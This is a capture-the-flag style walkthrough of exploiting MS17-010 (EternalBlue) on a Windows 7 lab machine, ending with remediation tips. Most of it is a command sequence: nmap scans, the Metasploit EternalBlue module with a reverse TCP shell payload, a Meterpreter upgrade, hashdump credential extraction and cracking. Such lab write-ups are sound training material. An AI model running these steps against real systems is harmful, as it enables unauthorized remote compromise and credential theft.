# 🛡️ Vulnerability Analysis: EternalBlue (Blue Walkthrough)

## 📝 Executive Summary
This walkthrough targets a Windows 7 machine vulnerable to **MS17-010 (EternalBlue)**, a critical remote code execution flaw. The process demonstrates the entire exploitation lifecycle: reconnaissance, vulnerability identification, gaining initial shell access, elevating to Meterpreter, credential extraction, and post-exploitation data (flag) retrieval.

---

## 🌐 Core Concepts
* **EternalBlue (MS17-010):** A vulnerability in the SMBv1 protocol that allows an attacker to execute arbitrary code with SYSTEM-level privileges.
* **Shell Stabilization:** The process of converting a basic reverse TCP shell into a robust Meterpreter session, which provides advanced post-exploitation capabilities.
* **Privilege Escalation:** Utilizing system-level access gained via exploitation to perform credential dumping and file system looting.

---

## 🛠️ Practical Reference

### Phase 1: Recon & Vulnerability Identification
1.  **Nmap Scan:** Identify open ports: `nmap -sV -sC -A -v <IP>`
    *   Look for ports 135, 139, and 445.
2.  **Vulnerability Check:** Use specialized Nmap scripts to confirm MS17-010:
    *   `nmap --script smb-vuln* -p 445 <IP>`

### Phase 2: Exploitation
1.  **Framework:** Launch `msfconsole`.
2.  **Select Exploit:** `use exploit/windows/smb/ms17_010_eternalblue`
3.  **Configure:** 
    *   `set RHOSTS <target_ip>`
    *   `set payload windows/x64/shell/reverse_tcp`
4.  **Execute:** `run` (or `exploit`)

### Phase 3: Post-Exploitation
1.  **Upgrade Shell:**
    *   Background the shell (`CTRL+Z`).
    *   Search: `search shell_to_meterpreter`
    *   Use: `use post/multi/manage/shell_to_meterpreter`
    *   Set: `set SESSION <id>`
    *   Run: `run`
2.  **Credential Dumping:**
    *   Access Meterpreter: `sessions -i <new_id>`
    *   Dump Hashes: `hashdump`
3.  **Cracking:** Copy the NTLM hash (the second portion of the dump) and use **Hashcat** or **John the Ripper** to retrieve the cleartext password.

### Phase 4: Flag Hunting
* **Locating Files:** Use the Meterpreter search command to find specific files:
    * `search -f flag*.txt`
* **Common Flag Locations:**
    * System Root (C:\)
    * Config/System directories
    * User profile documents/Desktop (Looting)

---

## 🛡️ Remediation
* **Disable SMBv1:** Disable the legacy SMBv1 protocol via Group Policy or PowerShell (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`).
* **Patch Management:** Ensure all Windows systems are updated with MS17-010 patches.
* **Firewalling:** Block port 445 from untrusted networks.

---

## 🧠 Key Takeaways
* **Session Management:** Proficiency in moving between backgrounded shells and Meterpreter sessions is vital for effective post-exploitation.
* **Post-Modules:** Metasploit's post-exploitation library (like `shell_to_meterpreter`) drastically reduces the complexity of upgrading limited shell access.
* **Hashing:** `hashdump` is highly effective when running as SYSTEM, providing instant access to all local user credentials.

---
**Task Status:** ✅ Completed